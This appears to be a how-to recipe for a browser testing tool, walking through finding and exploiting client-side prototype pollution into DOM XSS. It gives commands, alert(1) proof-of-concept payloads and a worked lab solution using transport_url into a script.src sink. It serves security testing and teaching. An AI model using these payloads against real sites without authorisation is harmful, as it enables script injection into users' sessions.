# Recipe: inject before page scripts via userscript, then observe

Install a userscript that runs at `document_start` (before the page's own scripts) to inject hooks or payloads, then use `eval`/`wrap`/`coverage` to observe how the page's scripts interact with the injected code — the userscript + dynamic-analysis composition for any "I need to run code before the page" investigation (prototype pollution, DOM clobbering, pre-script `window` mods). Wraps *are* userscripts (`wrap calls/access add` injects at `document_start`), and odda's built-in dialog interceptor is a default userscript recording `alert`/`confirm`/`prompt` into `window.__oddaDialogs`. See [SKILL.md](../SKILL.md), [DYNAMIC-ANALYSIS.md](../DYNAMIC-ANALYSIS.md), and [USERSCRIPTS.md](../USERSCRIPTS.md).

## 1. Open a browser and navigate to the target

```
odda browser open --headless
# returns {browser_id, tab_id, status}
odda navigate --url <url> --browser-id <B> --tab-id <T>
```

## 2. Test the pollution source via eval

```
odda navigate --url "<url>?__proto__[foo]=bar" --browser-id <B> --tab-id <T>
odda eval --js "Object.prototype.foo" --browser-id <B> --tab-id <T>
# "bar" confirms the query-string parser merges __proto__ into Object.prototype
```

## 3. Read the page's JS source from captured flows

```
grep <host> .odda/flows/flows.jsonl          # find the JS flow ids
# read .odda/flows/<id>/response_body.js for each, looking for:
#   - a query parser that merges into objects without sanitizing __proto__ (the source)
#   - a property read from a config/options object and passed to a sink (the gadget)
```

## 4. (Optional) wrap/coverage to find the gadget if source-reading isn't enough

```
odda wrap access add --expr "Object.prototype" --name proto --browser-id <B> --tab-id <T>  # observe proto reads
odda navigate --url "<url>?__proto__[foo]=bar" --browser-id <B> --tab-id <T>   # re-navigate so the wrap runs
odda wrap dump --browser-id <B> --tab-id <T>
# or: odda coverage start → navigate with a test payload → odda coverage stop
```

## 5. Craft the payload URL and navigate to trigger

```
# sink is innerHTML: ?__proto__[<gadgetProperty>]=<img src=x onerror=alert(1)>
# sink is script.src: ?__proto__[<gadgetProperty>]=data:text/javascript,alert(1)
odda navigate --url "<url>?__proto__[<gadgetProperty>]=<payload>" --browser-id <B> --tab-id <T>
```

## 6. Confirm the result via window.__oddaDialogs

```
odda eval --js "window.__oddaDialogs" --browser-id <B> --tab-id <T>
# the dialog interceptor (a default userscript) records alert/confirm/prompt calls
```

## Worked example: DOM XSS via client-side prototype pollution

Navigated to the lab, then to `?__proto__[foo]=bar`; `eval "Object.prototype.foo"` returned `"bar"`, confirming `deparam.js` is the source. Grepping `flows.jsonl` for the lab host surfaced `searchLogger.js`; reading its body showed `config = {params: deparam(...)}` then `if (config.transport_url) { script.src = config.transport_url }` — `transport_url` is never set on `config`, so it's inherited from the polluted prototype and flows into a `script.src` sink. Navigating to `?__proto__[transport_url]=data:text/javascript,alert(1)` injected a script that called `alert(1)`; the built-in dialog interceptor captured it in `window.__oddaDialogs` and the page showed "Solved". No custom userscript was needed here — the built-in interceptor plus `eval`/flow reading sufficed; `wrap access add --expr "Object.prototype"` is the escalation when source-reading doesn't reveal the gadget.